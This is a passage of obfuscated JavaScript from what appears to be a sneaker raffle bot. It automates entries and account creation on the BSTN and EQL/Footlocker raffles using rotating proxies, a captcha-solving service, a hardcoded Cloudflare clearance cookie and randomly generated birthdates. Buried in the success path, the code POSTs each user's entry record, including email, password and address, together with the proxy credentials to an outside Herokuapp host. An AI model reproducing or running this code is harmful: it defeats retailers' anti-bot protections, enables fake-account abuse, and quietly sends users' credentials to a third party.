                            let _0x4cef4d = ![];
                            for (var _0x2848b2 of _0x4953b4) {
                                if (_0x2848b2['Url'] == _0x576eac['Url'] && _0x2848b2['Email'] == _0x576eac['Email']) {
                                    _0x4cef4d = !![];
                                    break;
                                }
                            }
                            return _0x4cef4d;
                        }
                        if (await _0x1ea5b9(_0x19bdd2[_0x20e347]) == !![]) {
                            console['log'](_0x5c3ac1() + '\x20[' + _0x5270c8['name'] + ']\x20Task\x20' + (_0x20e347 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                            continue;
                        }
                        if (_0x208b0b != 'yes')
                            var _0x208b0b = '', _0x3c9784 = 0x0;
                        _0x5c316f(_0x5270c8['name'] + '\x20Task\x20' + (_0x20e347 + 0x1) + '\x20/\x20' + _0x19bdd2['length'] + '\x20||\x20File:\x20' + _0x49db92 + '\x20Proxies:\x20' + _0x33a3cd);
                        var _0x37bc24 = Math['round'](Math['random']() * (_0x47f6fa['length'] - 0x1)), _0x52bc76 = _0x47f6fa[_0x37bc24]['split'](':'), _0x2c4322;
                        try {
                            _0x2c4322 = await _0x39c115['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x52bc76[0x0] + ':' + _0x52bc76[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x2c4322 = await _0x39c115['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x52bc76[0x0] + ':' + _0x52bc76[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x36b773 = await _0x2c4322['newPage'](), _0x27a837 = await _0x36b773['target']()['createCDPSession'](), { windowId: _0x2bce93 } = await _0x27a837['send']('Browser.getWindowForTarget');
                            await _0x36b773['setViewport']({
                                'width': 0x501,
                                'height': 0x2d0
                            });
                            var _0x2fc8ae = [{
                                'name': 'cf_clearance',
                                'value': 'uyuh7Wo9shR3zcpWvbWJ04mG0iNC2N25mhp1FNAbHYY-1676282182-0-1-9764d0ee.e7bea100.c0658f0e-160',
                                'domain': '.bstn.com',
                                'path': '/',
                                'expires': 1707818183.331533,
                                'httpOnly': !![],
                                'secure': !![]
                            }];
                            await _0x36b773['authenticate']({
                                'username': '' + _0x52bc76[0x2],
                                'password': '' + _0x52bc76[0x3]
                            }), console['log'](_0x5c3ac1() + '\x20[' + _0x5270c8['name'] + ']\x20Task\x20' + (_0x20e347 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x36b773['goto']('' + _0x19bdd2[_0x20e347]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x5c3ac1() + '\x20[' + _0x5270c8['name'] + ']\x20Task\x20' + (_0x20e347 + 0x1) + '\x20:\x20Solving\x20Cloudflare');
                            var _0x24a806 = await _0x36b773['$']('.hcaptcha-box');
                            if (_0x24a806) {
                                console['log'](_0x5c3ac1() + '\x20[' + _0x5270c8['name'] + ']\x20Task\x20' + (_0x20e347 + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0xf987cc(0x2710);
                                const _0x3d5a09 = await _0x36b773['$']('.hcaptcha-box');
                                if (_0x3d5a09)
                                    try {
                                        await _0x3d5a09['click']();
                                    } catch {
                                        throw new Error('Empty\x20Turnstile\x20Challenge');
                                    }
                                try {
                                    await _0x36b773['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                } catch {
                                    var _0xdaaa41 = await _0x36b773['$']('.hcaptcha-box');
                                    if (_0xdaaa41)
                                        try {
                                            await _0xdaaa41['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                }
                            }
                            try {
                                await _0x36b773['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L');
                            } catch {
                                throw new Error('Blocked\x20by\x20Cloudflare');
                            }
                            await _0x27a837['send']('Browser.setWindowBounds', {
                                'windowId': _0x2bce93,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0xf987cc(0x1388), await _0x36b773['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x36b773['focus']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0xf987cc(0x1f4), console['log'](_0x5c3ac1() + '\x20[' + _0x5270c8['name'] + ']\x20Task\x20' + (_0x20e347 + 0x1) + '\x20:\x20Logging\x20in'), await _0x36b773['$eval']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb', _0x5e4b33 => _0x5e4b33['click']()), await _0x36b773['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x36b773['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0xf987cc(0x7d0), await _0x36b773['waitForSelector']('#email-login'), await _0x36b773['type']('#email-login', '' + _0x19bdd2[_0x20e347]['Email']), await _0xf987cc(0xdac), await _0x36b773['waitForSelector']('#password'), await _0x36b773['type']('#password', '' + _0x19bdd2[_0x20e347]['Password'], { 'delay': 0xe6 }), await _0xf987cc(0x157c);
                            try {
                                await _0x36b773['$eval']('.login_accountInfo__FCIxY\x20>\x20button[type=\x22submit\x22]', _0x4a47c6 => _0x4a47c6['click']());
                            } catch {
                            }
                            try {
                                await _0x36b773['waitForSelector']('.swatchOptions_sizeTiles__Lizc2');
                            } catch (_0x55b070) {
                            }
                            await _0xf987cc(0x3e8);
                            const _0x59c54c = await _0x36b773['$']('.enteredDraw_container__2KmQ_');
                            if (_0x59c54c)
                                throw new Error('Duplicate\x20Entry');
                            console['log'](_0x5c3ac1() + '\x20[' + _0x5270c8['name'] + ']\x20Task\x20' + (_0x20e347 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x19bdd2[_0x20e347]['Size']);
                            try {
                                if (_0x19bdd2[_0x20e347]['Size'] != 'RANDOM') {
                                    var _0x1d0b77 = _0x19bdd2[_0x20e347]['Size']['replace']('.', ',');
                                    const _0x34ace0 = await _0x36b773['$x']('//div[contains(text(),\x20\x27' + _0x1d0b77 + '\x27)]');
                                    await _0x34ace0[0x0]['click']();
                                } else {
                                    const _0x1e8104 = await _0x36b773['$$']('div.swatchTile_tile__IRH9Q');
                                    var _0x1757dd = Math['round'](Math['random']() * (_0x1e8104['length'] - 0x1));
                                    await _0x1e8104[_0x1757dd]['click']();
                                }
                            } catch (_0x5dbc3b) {
                                throw new Error('Softblocked,\x20Rotating\x20proxy');
                            }
                            await _0xf987cc(0x1f4);
                            const _0x2f9b90 = await _0x36b773['$']('.addressList_addressItem__LE2PB');
                            if (_0x2f9b90 && _0x19bdd2[_0x20e347]['Mode'] != 'NEW') {
                            } else
                                console['log'](_0x5c3ac1() + '\x20[' + _0x5270c8['name'] + ']\x20Task\x20' + (_0x20e347 + 0x1) + '\x20:\x20Filling\x20Address'), await _0x36b773['click']('div.product_shipping__zEfqd\x20>\x20div\x20>\x20div.legend_legend__sQIiF\x20>\x20div.legend_header__iHZIh\x20>\x20div\x20>\x20button'), await _0xf987cc(0x5dc), await _0x36b773['waitForSelector']('#firstname'), await _0x36b773['type']('#firstname', '' + _0x19bdd2[_0x20e347]['FirstName']), await _0xf987cc(0x1f4), await _0x36b773['waitForSelector']('#firstname'), await _0x36b773['type']('#lastname', '' + _0x19bdd2[_0x20e347]['LastName']), await _0xf987cc(0x1f4), await _0x36b773['waitForSelector']('#firstname'), await _0x36b773['type']('#street', '' + _0x19bdd2[_0x20e347]['Address1']), await _0xf987cc(0x1f4), await _0x36b773['waitForSelector']('#firstname'), await _0x36b773['type']('#houseNumber', _0x19bdd2[_0x20e347]['HouseNumber'] + '\x20' + _0x19bdd2[_0x20e347]['Address2']), await _0xf987cc(0x1f4), await _0x36b773['waitForSelector']('#firstname'), await _0x36b773['select']('#country_code', '' + _0x19bdd2[_0x20e347]['Country']), await _0xf987cc(0x1f4), await _0x36b773['type']('#postcode', '' + _0x19bdd2[_0x20e347]['Zip']), await _0xf987cc(0x1f4), await _0x36b773['type']('#city', '' + _0x19bdd2[_0x20e347]['City']), await _0xf987cc(0x1f4), await _0x36b773['type']('#telephone', '' + _0x19bdd2[_0x20e347]['Phone']), await _0xf987cc(0x1f4), await _0x36b773['click']('.addressModal_submit__dOiL4\x20>\x20button[type=\x22submit\x22]');
                            await _0xf987cc(0x9c4);
                            try {
                                await _0x36b773['type']('#instagram_name', '' + _0x19bdd2[_0x20e347]['Follower']), await _0x36b773['click']('.note_groupBtn__WLDwH\x20>\x20button');
                            } catch {
                            }
                            console['log'](_0x5c3ac1() + '\x20[' + _0x5270c8['name'] + ']\x20Task\x20' + (_0x20e347 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0xf987cc(0x5dc);
                            try {
                                await _0x36b773['click']('.checkBox_boxHolder__wLGVe');
                            } catch {
                            }
                            await _0xf987cc(0x5dc), await _0x36b773['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x3255c5 => _0x3255c5['click']()), await _0xf987cc(0x1388);
                            try {
                                await _0x36b773['waitForSelector']('.success_msg__2HjJY');
                            } catch {
                                await _0x36b773['reload']({ 'waitUntil': 'networkidle2' });
                                if (_0x19bdd2[_0x20e347]['Size'] != 'RANDOM') {
                                    var _0x1d0b77 = _0x19bdd2[_0x20e347]['Size']['replace']('.', ',');
                                    const _0x46a4d1 = await _0x36b773['$x']('//div[contains(text(),\x20' + _0x1d0b77 + ')]');
                                    await _0x46a4d1[0x0]['click']();
                                } else {
                                    const _0x31793f = await _0x36b773['$$']('div.swatchTile_tile__IRH9Q');
                                    var _0x1757dd = Math['round'](Math['random']() * (_0x31793f['length'] - 0x1));
                                    await _0x31793f[_0x1757dd]['click']();
                                }
                                await _0xf987cc(0x5dc);
                                try {
                                    await _0x36b773['hover']('#instagram_name'), await _0x36b773['type']('#instagram_name', '' + _0x19bdd2[_0x20e347]['Follower']), await _0x36b773['click']('.note_groupBtn__WLDwH\x20>\x20button');
                                } catch {
                                }
                                console['log'](_0x5c3ac1() + '\x20[' + _0x5270c8['name'] + ']\x20Task\x20' + (_0x20e347 + 0x1) + '\x20:\x20Retrying\x20(' + _0x3c9784 + '\x20/\x205)');
                                try {
                                    await _0x36b773['hover']('.checkBox_boxHolder__wLGVe'), await _0xf987cc(0x5dc), await _0x36b773['click']('.checkBox_boxHolder__wLGVe');
                                } catch {
                                }
                                await _0xf987cc(0x157c), await _0x36b773['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x537565 => _0x537565['click']()), await _0xf987cc(0x1388), await _0x36b773['waitForSelector']('.success_msg__2HjJY');
                            }
                            _0x208b0b = 'no', _0x46ba09(_0x19bdd2[_0x20e347], _0x5270c8);
                            try {
                                prxdata = {
                                    'username': _0x5ad930['replace']('#', ''),
                                    'entrydata': JSON['stringify'](_0x308996),
                                    'proxy': '' + _0x47f6fa[_0x20e347]
                                };
                                var _0x39e6e5 = JSON['stringify'](prxdata);
                                let _0x3eed25 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x529551['post']('https://jraffles.herokuapp.com/success', _0x39e6e5, _0x3eed25);
                            } catch (_0x43b9ef) {
                            }
                            console['log'](_0x2c0b56['green'](_0x5c3ac1() + '\x20[' + _0x5270c8['name'] + ']\x20Task\x20' + (_0x20e347 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            var _0x1c0db8 = await _0x539676(_0x19bdd2[_0x20e347], _0x5270c8, 'dev', ![]), _0x5a2d52 = await _0x539676(_0x19bdd2[_0x20e347], _0x5270c8, 'pub', ![]);
                            const _0x18797e = {
                                'succesDEVMSG': { 'embeds': [_0x1c0db8] },
                                'succesPUBMSG': { 'embeds': [_0x5a2d52] }
                            };
                            let _0x308996 = _0x19bdd2[_0x20e347];
                            try {
                                prxdata = {
                                    'username': _0x5ad930['replace']('#', ''),
                                    'module': _0x5270c8['name'],
                                    'entrydata': JSON['stringify'](_0x308996),
                                    'proxy': '' + _0x47f6fa[_0x20e347]
                                };
                                var _0x39e6e5 = JSON['stringify'](prxdata);
                                let _0x43bc7e = { 'headers': { 'content-type': 'application/json' } };
                                await _0x529551['post']('https://jraffles.herokuapp.com/success', _0x39e6e5, _0x43bc7e);
                            } catch (_0x5dd9af) {
                            }
                            try {
                                _0x51f80a['webhook'] != undefined && _0x51f80a['webhook'] != '' && await _0x215470(_0x51f80a['webhook'], _0x18797e['succesDEVMSG']), await _0xf987cc(0xc8), await _0x215470(_0x43acb0, _0x18797e['succesDEVMSG']), await _0xf987cc(0xc8), await _0x215470(_0x255a14, _0x18797e['succesPUBMSG']);
                            } catch (_0x55dcf5) {
                                console['log'](_0x2c0b56['yellow'](_0x5c3ac1() + '\x20[' + _0x5270c8['name'] + ']\x20Task\x20' + (_0x20e347 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x55dcf5));
                            }
                        } catch (_0x1aaa47) {
                            console['log'](_0x2c0b56['red'](_0x5c3ac1() + '\x20[' + _0x5270c8['name'] + ']\x20Task\x20' + (_0x20e347 + 0x1) + '\x20:\x20' + _0x1aaa47)), _0x208b0b = 'yes', _0xfb7df9 = '' + _0x1aaa47;
                            var _0x21123b = await _0x539676(_0x19bdd2[_0x20e347], _0x5270c8, 'dev', !![], _0xfb7df9), _0x1c0db8 = await _0x539676(_0x19bdd2[_0x20e347], _0x5270c8, 'dev', ![]), _0x5a2d52 = await _0x539676(_0x19bdd2[_0x20e347], _0x5270c8, 'pub', ![]);
                            const _0x546ec7 = {
                                'succesDEVMSG': { 'embeds': [_0x1c0db8] },
                                'succesPUBMSG': { 'embeds': [_0x5a2d52] }
                            };
                            _0x546ec7['errorDEV'] = { 'embeds': [_0x21123b] }, _0x51f80a['webhook'] != undefined && _0x51f80a['webhook'] != '' && await _0x215470(_0x51f80a['webhook'], _0x546ec7['errorDEV']), await _0x215470(_0x1dec8a, _0x546ec7['errorDEV']);
                        } finally {
                            _0x2c4322['close']();
                            if (_0x208b0b == 'yes' && _0x3c9784 != 0x5) {
                                console['log'](_0x2c0b56['red'](_0x5c3ac1() + '\x20[' + _0x5270c8['name'] + ']\x20Task\x20' + (_0x20e347 + 0x1) + '\x20:\x20Retrying\x20(' + _0x3c9784 + '\x20/\x205)')), _0x20e347 = _0x20e347 - 0x1, _0x3c9784 = _0x3c9784 + 0x1;
                                continue;
                            }
                            _0x208b0b == 'yes' && _0x3c9784 >= 0x5 && (_0x46ac44(_0x19bdd2[_0x20e347], _0x5270c8), _0x208b0b = 'no', _0x3c9784 = 0x0), console['log'](_0x5c3ac1() + '\x20[' + _0x5270c8['name'] + ']\x20Waiting\x20for\x20' + _0x51f80a['delay'] + '\x20ms'), await _0xf987cc(_0x51f80a['delay']);
                        }
                    }
                }
            },
            {
                'name': 'BSTN\x20Win\x20Checker',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0xfb4e4f, _0x228357) {
                    _0x39c115['use'](_0x5cc924()), _0x39c115['use'](_0x63578e({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x51f80a['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    var _0x2abec0;
                    try {
                        const _0x24665b = _0x3f8380['readFileSync']('../accounts/bstn.csv', 'utf-8');
                        _0x2abec0 = _0x11f8e1['parse'](_0x24665b, { 'header': !![] })['data'];
                    } catch (_0x38cb86) {
                        throw new Error('Error\x20reading\x20accounts/bstn.csv');
                    }
                    for (var _0x39807e = 0x0; _0x39807e < _0x2abec0['length']; _0x39807e++) {
                        if (_0x1f5ea0 != 'yes')
                            var _0x1f5ea0 = '', _0x4bcbcd = 0x0;
                        var _0x506ac7;
                        _0x5c316f(_0xfb4e4f['name'] + '\x20Task\x20' + (_0x39807e + 0x1) + '\x20/\x20' + _0x2abec0['length'] + '\x20||\x20File:\x20' + _0x49db92 + '\x20Proxies:\x20' + _0x33a3cd);
                        var _0x3b9eee = await _0x539676(_0x2abec0[_0x39807e], _0xfb4e4f, 'acc', ![]);
                        const _0x4f4a18 = { 'succesDEVMSG': { 'embeds': [_0x3b9eee] } }, _0x81bd49 = 'https://www.bstn.com/eu_en/customer/account/create/';
                        var _0x33cc97 = Math['round'](Math['random']() * (_0x228357['length'] - 0x1)), _0x4abbc8 = _0x228357[_0x33cc97]['split'](':'), _0x52c517;
                        try {
                            _0x52c517 = await _0x39c115['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x4abbc8[0x0] + ':' + _0x4abbc8[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x52c517 = await _0x39c115['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x4abbc8[0x0] + ':' + _0x4abbc8[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x588d23 = await _0x52c517['newPage']();
                            await _0x588d23['authenticate']({
                                'username': '' + _0x4abbc8[0x2],
                                'password': '' + _0x4abbc8[0x3]
                            }), console['log'](_0x5c3ac1() + '\x20[' + _0xfb4e4f['name'] + ']\x20Task\x20' + (_0x39807e + 0x1) + '\x20:\x20Getting\x20Session'), await _0x588d23['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x588d23['setRequestInterception'](!![]), _0x588d23['on']('request', _0x3b3035 => {
                                _0x3b3035['resourceType']() === 'image' ? _0x3b3035['abort']() : _0x3b3035['continue']();
                            });
                            try {
                                await _0x588d23['goto']('https://www.bstn.com/eu_en/raffle/customer/', { 'waitUntil': 'networkidle2' }), await _0x588d23['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                            } catch {
                                _0x1f5ea0 = 'yes';
                                throw new Error('Connection\x20Error');
                            }
                            await _0x588d23['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x5c3ac1() + '\x20[' + _0xfb4e4f['name'] + ']\x20Task\x20' + (_0x39807e + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0xf987cc(0x3e8), await _0x588d23['type']('#email', _0x2abec0[_0x39807e]['Email']), await _0xf987cc(0x1f4), await _0x588d23['type']('#pass', _0x2abec0[_0x39807e]['Password']), await _0xf987cc(0x1f4), await _0x588d23['$eval']('#login-form', _0x181d23 => _0x181d23['submit']());
                            try {
                                await _0x588d23['waitForSelector']('.product-items');
                            } catch {
                                console['log'](_0x5c3ac1() + '\x20[' + _0xfb4e4f['name'] + ']\x20Task\x20' + (_0x39807e + 0x1) + '\x20:\x20No\x20Entries\x20Found');
                                continue;
                            }
                            await _0xf987cc(0x190);
                            const _0x5c157b = await _0x588d23['evaluate'](() => {
                                const _0x43bdcd = Array['from'](document['querySelectorAll']('.product-item-photo\x20>\x20img'));
                                return _0x43bdcd['map'](_0x3cc9fe => _0x3cc9fe['alt']);
                            }), _0x578416 = await _0x588d23['evaluate'](() => {
                                const _0x3cb959 = Array['from'](document['querySelectorAll']('.tooltip.wrapper.product-item-tooltip.first-xs'));
                                return _0x3cb959['map'](_0x5e59c2 => _0x5e59c2['innerHTML']);
                            }), _0xfcb3a = await _0x588d23['$$']('.raffle-winner');
                            if (_0xfcb3a['length'] < 0x1) {
                                console['log'](_0x5c3ac1() + '\x20[' + _0xfb4e4f['name'] + ']\x20Task\x20' + (_0x39807e + 0x1) + '\x20:\x20No\x20Wins\x20Found'), _0x1f5ea0 = 'no';
                                continue;
                            }
                            console['log'](_0x5c3ac1() + '\x20[' + _0xfb4e4f['name'] + ']\x20Task\x20' + (_0x39807e + 0x1) + '\x20:\x20' + _0xfcb3a['length'] + '\x20Wins\x20Found!');
                            for (var _0x31b378 = 0x0; _0x31b378 < _0xfcb3a['length']; _0x31b378++) {
                                console['log'](_0x2c0b56['green'](_0x5c157b[_0x31b378] + _0x578416[_0x31b378]['replace']('\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20', '')));
                            }
                        } catch (_0x295718) {
                            console['log'](_0x2c0b56['red'](_0x5c3ac1() + '\x20[' + _0xfb4e4f['name'] + ']\x20Task\x20' + (_0x39807e + 0x1) + '\x20:\x20' + _0x295718)), _0x506ac7 = '' + _0x295718;
                            var _0x1a3d5b = await _0x539676(_0x2abec0[_0x39807e], _0xfb4e4f, 'acc', !![], _0x506ac7);
                            _0x4f4a18['errorDEV'] = { 'embeds': [_0x1a3d5b] }, _0x51f80a['webhook'] != undefined && _0x51f80a['webhook'] != '' && await _0x215470(_0x51f80a['webhook'], _0x4f4a18['errorDEV']), await _0x215470(_0x1dec8a, _0x4f4a18['errorDEV']), _0x1f5ea0 = 'yes';
                        } finally {
                            if (_0x52c517)
                                _0x52c517['close']();
                            if (_0x1f5ea0 == 'yes' && _0x4bcbcd != 0x5) {
                                console['log'](_0x2c0b56['red'](_0x5c3ac1() + '\x20[' + _0xfb4e4f['name'] + ']\x20Task\x20' + (_0x39807e + 0x1) + '\x20:\x20Retrying\x20(' + _0x4bcbcd + '\x20/\x205)')), _0x39807e = _0x39807e - 0x1, _0x4bcbcd = _0x4bcbcd + 0x1;
                                continue;
                            }
                            _0x1f5ea0 == 'yes' && _0x4bcbcd >= 0x5 && (_0x46ac44(_0x2abec0[_0x39807e], _0xfb4e4f), _0x1f5ea0 = 'no', _0x4bcbcd = 0x0), console['log'](_0x5c3ac1() + '\x20[' + _0xfb4e4f['name'] + ']\x20Waiting\x20for\x20' + _0x51f80a['delay'] + '\x20ms'), await _0xf987cc(_0x51f80a['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'EQL',
        'modules': [{
            'name': 'EQL\x20Raffle\x20Entries',
            'store': 'EQL',
            'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,h_170,w_170,f_auto,b_white,q_auto:eco,dpr_1/qfc09zbor8py2zfmsdr2',
            'function': async function (_0x51a5e1, _0x2e4100, _0x1489e3) {
                _0x39c115['use'](_0x5cc924()), _0x39c115['use'](_0x63578e({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x51f80a['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x367e9d = 0x0; _0x367e9d < _0x2e4100['length']; _0x367e9d++) {
                    var _0x5447bb;
                    _0x5c316f(_0x51a5e1['name'] + '\x20Task\x20' + (_0x367e9d + 0x1) + '\x20/\x20' + _0x2e4100['length'] + '\x20||\x20File:\x20' + _0x49db92 + '\x20Proxies:\x20' + _0x33a3cd);
                    try {
                        await _0x3d5d40(_0x2e4100, _0x367e9d);
                    } catch {
                        _0x19b757 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0xb9e709(_0xdf53c) {
                        const _0x5020e1 = _0x3f8380['readFileSync']('../successful-tasks.csv', 'utf8'), _0x5609a2 = _0x11f8e1['parse'](_0x5020e1, { 'header': !![] })['data'];
                        let _0x8d472e = ![];
                        for (var _0x53903e of _0x5609a2) {
                            if (_0x53903e['Url'] == _0xdf53c['Url'] && _0x53903e['Email'] == _0xdf53c['Email']) {
                                _0x8d472e = !![];
                                break;
                            }
                        }
                        return _0x8d472e;
                    }
                    if (await _0xb9e709(_0x2e4100[_0x367e9d]) == !![]) {
                        console['log'](_0x5c3ac1() + '\x20[' + _0x51a5e1['name'] + ']\x20Task\x20' + (_0x367e9d + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0x52002e = ![];
                    const _0x12b35a = _0x3f8380['readFileSync']('../accounts/eql.csv', 'utf8');
                    var _0x20c73f = _0x11f8e1['parse'](_0x12b35a, { 'header': !![] })['data'];
                    for (var _0x5beff0 of _0x20c73f) {
                        _0x5beff0['Email'] == _0x2e4100[_0x367e9d]['Email'] && (_0x52002e = !![]);
                    }
                    if (_0x52002e == ![]) {
                        var _0x427c24;
                        if (_0x2e4100[_0x367e9d]['Url']['endsWith']('/')) {
                            _0x427c24 = _0x2e4100[_0x367e9d]['Url'] + 'register';
                            if (_0x19b757 != 'yes')
                                var _0x19b757 = '', _0x255e03 = 0x0;
                        } else {
                            _0x427c24 = _0x2e4100[_0x367e9d]['Url'] + '/register';
                            if (_0x19b757 != 'yes')
                                var _0x19b757 = '', _0x255e03 = 0x0;
                        }
                        if (_0x2e4100[_0x367e9d]['Email'] == '' || _0x2e4100[_0x367e9d]['FirstName'] == '' || _0x2e4100[_0x367e9d]['LastName'] == '') {
                            console['log'](_0x5c3ac1() + '\x20[' + _0x51a5e1['name'] + ']\x20Task\x20' + (_0x367e9d + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x2e4100[_0x367e9d]['Password'] == '' && (_0x2e4100[_0x367e9d]['Password'] = 'JRaffles23!');
                        if (_0x51f80a['useRandomProxy'] = ![])
                            var _0x580bd0 = _0x1489e3[_0x367e9d]['split'](':');
                        else
                            var _0x881c94 = Math['round'](Math['random']() * (_0x1489e3['length'] - 0x1)), _0x580bd0 = _0x1489e3[_0x881c94]['split'](':');
                        var _0x4b5c19;
                        try {
                            _0x4b5c19 = await _0x39c115['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x580bd0[0x0] + ':' + _0x580bd0[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x4b5c19 = await _0x39c115['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x580bd0[0x0] + ':' + _0x580bd0[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x5e4531 = await _0x4b5c19['newPage']();
                            await _0x5e4531['authenticate']({
                                'username': '' + _0x580bd0[0x2],
                                'password': '' + _0x580bd0[0x3]
                            }), console['log'](_0x5c3ac1() + '\x20[' + _0x51a5e1['name'] + ']\x20Task\x20' + (_0x367e9d + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5e4531['setRequestInterception'](!![]), _0x5e4531['on']('request', _0xaa7ce7 => {
                                _0xaa7ce7['resourceType']() === 'image' || _0xaa7ce7['resourceType']() === 'font' || _0xaa7ce7['resourceType']() === 'media' ? _0xaa7ce7['abort']() : _0xaa7ce7['continue']();
                            });
                            try {
                                await _0x5e4531['goto']('' + _0x427c24);
                            } catch {
                                throw new Error('Connection\x20Error');
                            }
                            console['log'](_0x5c3ac1() + '\x20[' + _0x51a5e1['name'] + ']\x20Task\x20' + (_0x367e9d + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0xf987cc(0x3e8), await _0x5e4531['waitForSelector']('#email'), await _0x5e4531['click']('div[data-testid=\x22field-productVariantID\x22]'), await _0xf987cc(0x3e8);
                            try {
                                _0x2e4100[_0x367e9d]['Url']['includes']('en-GB') ? await _0x5e4531['click']('li[data-value=\x22UK\x20' + _0x2e4100[_0x367e9d]['Size'] + '\x20/\x20US\x20' + (Number(_0x2e4100[_0x367e9d]['Size']) + 0x1) + '\x22]') : await _0x5e4531['click']('li[data-value=\x22EU\x20' + _0x2e4100[_0x367e9d]['Size'] + '\x22]');
                            } catch {
                                throw new Error('Error\x20fetching\x20' + _0x2e4100[_0x367e9d]['Size']);
                            }
                            await _0xf987cc(0x6a4), await _0x5e4531['type']('#email', '' + _0x2e4100[_0x367e9d]['Email']), await _0xf987cc(0x352), await _0x5e4531['waitForSelector']('#password'), await _0x5e4531['type']('#password', '' + _0x2e4100[_0x367e9d]['Password']), await _0xf987cc(0x352), await _0x5e4531['type']('#phone', '' + _0x2e4100[_0x367e9d]['Phone']), await _0xf987cc(0x352);
                            const _0x5a4945 = await _0x5e4531['$']('#title\x20>\x20label');
                            await _0xf987cc(0x12c);
                            _0x5a4945 && await _0x5a4945['click']();
                            await _0x5e4531['type']('#firstName', '' + _0x2e4100[_0x367e9d]['FirstName']), await _0xf987cc(0x352), await _0x5e4531['type']('#lastName', '' + _0x2e4100[_0x367e9d]['LastName']), await _0xf987cc(0x352);
                            _0x2e4100[_0x367e9d]['Url']['includes']('footlocker.de') ? await _0x5e4531['type']('#birthdate', _0x5ab5b3(0xa, 0x1c) + '.' + _0x5ab5b3(0xa, 0xc) + '.' + _0x5ab5b3(0x7c6, 0x7d3)) : await _0x5e4531['type']('#birthdate', _0x5ab5b3(0xa, 0x1c) + '-' + _0x5ab5b3(0xa, 0xc) + '-' + _0x5ab5b3(0x7c6, 0x7d3));
                            await _0xf987cc(0x352), await _0x5e4531['click']('.MuiBox-root.css-79elbk\x20>\x20button');
